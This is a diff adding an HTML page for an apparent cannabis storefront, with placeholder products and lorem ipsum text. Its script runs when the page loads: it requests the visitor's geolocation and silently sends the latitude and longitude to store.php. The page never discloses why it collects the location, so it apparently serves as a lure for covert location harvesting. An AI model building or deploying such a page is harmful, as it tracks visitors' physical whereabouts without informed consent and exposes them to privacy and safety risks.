@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Cannabis Growing</title>
+    <link rel="stylesheet" href="premiumWeb.css">
+</head>
+<body onload="getLocation()">
+    <header>
+        <div class="container">
+            <h1>Premium Cannabis Growing</h1>
+            <nav>
+                <ul>
+                    <li><a href="#products">Products</a></li>
+                    <li><a href="#about">About</a></li>
+                    <li><a href="#contact">Contact</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header><br />
+    <!-- Location: -->
+    <p id="demo"></p>
+    <script>
+    const x = document.getElementById("demo");
+
+    function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+    }    else { 
+            x.innerHTML = "Geolocation is not supported by this browser.";
+        }
+    }
+
+        function showPosition(position) {
+            const xhttp = new XMLHttpRequest();
+            xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+            xhttp.send();
+        }
+    </script>
+
+    <section id="products">
+        <div class="container">
+            <h2>Featured Products</h2>
+            <div class="product">
+                <img src="cannabis1.jpg" alt="Premium Cannabis 1">
+                <h3>Premium Cannabis Strain 1</h3>
+                <p>Description of the product.</p>
+                <button>Buy Now</button><hr>
+            </div>
+            <div class="product">
+                <img src="cannabis2.jpg" alt="Premium Cannabis 2">
+                <h3>Premium Cannabis Strain 2</h3>
+                <p>Description of the product.</p>
+                <button>Buy Now</button><hr>
+            </div>
+        </div>
+    </section>
+    <section id="about">
+        <div class="container">
+            <h2>About Premium Cannabis Growing</h2>
+            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus aliquam, ligula eget fermentum volutpat, mauris est lacinia nisi, vel feugiat nisl odio sit amet purus.</p>
+            <p>Etiam nec ligula eget enim bibendum dapibus. Nullam auctor massa in enim ultricies, id maximus arcu efficitur.</p>
+        </div>
+    </section>
+    <section id="contact">
+        <div class="container">
+            <h2>Contact Us</h2>
+            <form>
+                <input type="text" placeholder="Your Name" required>
+                <input type="email" placeholder="Your Email" required>
+                <textarea placeholder="Your Message" required></textarea>
+                <button type="submit">Send</button>
+            </form>
+        </div>
+    </section>
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 Premium Cannabis Growing</p>
+        </div>
+    </footer>
+</body>
+</html>
